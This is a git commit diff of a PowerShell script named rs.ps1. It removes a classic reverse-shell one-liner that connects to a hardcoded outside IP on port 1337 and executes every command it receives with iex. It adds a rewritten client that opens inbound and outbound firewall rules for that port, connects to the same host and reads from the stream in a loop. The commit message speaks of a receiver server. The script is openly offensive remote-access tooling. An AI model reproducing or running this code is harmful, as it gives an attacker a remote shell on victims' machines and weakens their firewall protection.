b7a660f345aaad4cc4d9c8146c336f1a1d5990d6
logan <loganmitchell2011@gmail.com>
2022-06-23 21:14:36 -0400

    Added receiver server and modified the hell out of the client payload.

--- rs.ps1
+++ rs.ps1
@@ -1,1 +1,51 @@
-$client = New-Object System.Net.Sockets.TCPClient("{73.113.78.58}",{1337});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+if (!$(Get-NetFirewallRule -DisplayName "rs1in" 2>$null)) {
+	New-NetFirewallRule -DisplayName "rs1in" -Direction Inbound -LocalPort 1337 -Protocol TCP -Action Allow
+} else {
+	Write-Output "Rule already exists";
+}
+
+if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
+	New-NetFirewallRule -DisplayName "rs1out" -Direction Outbound -LocalPort 1337 -Protocol TCP -Action Allow
+} else {
+	Write-Output "Rule already exists";
+}
+
+try {
+	$client = New-Object System.Net.Sockets.TCPClient("73.113.78.58", 1337);
+	$stream = $client.GetStream();
+	$writer = New-Object System.IO.StreamWriter($stream);
+	$reader = New-Object System.IO.StreamReader($stream);
+	$writer.Write("startup");
+	$stream.Flush();
+	$in_buff = [char[]]::new(1024)
+	$out_msg = "";
+	$exit = 0;
+	while ($exit -eq 0) {
+		Write-Output "HIT";
+		while ($reader.Peek() -ge 0) {		
+			$in_buff = $reader.ReadLine();
+		}
+		if($stream.Connected) {
+			
+		} else {
+			$exit = 1;
+		}
+		Write-Output $in_buff;
+	}
+	
+	#$in_buff = $reader.ReadLine();
+	#Write-Output $in_buff;
+	#$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+	
+	#$i = $stream.Read($bytes, 0, $bytes.Length)
+
+	
+	
+	$client.Close()
+
+	
+}
+catch {
+	Write-Output $_;
+}
+
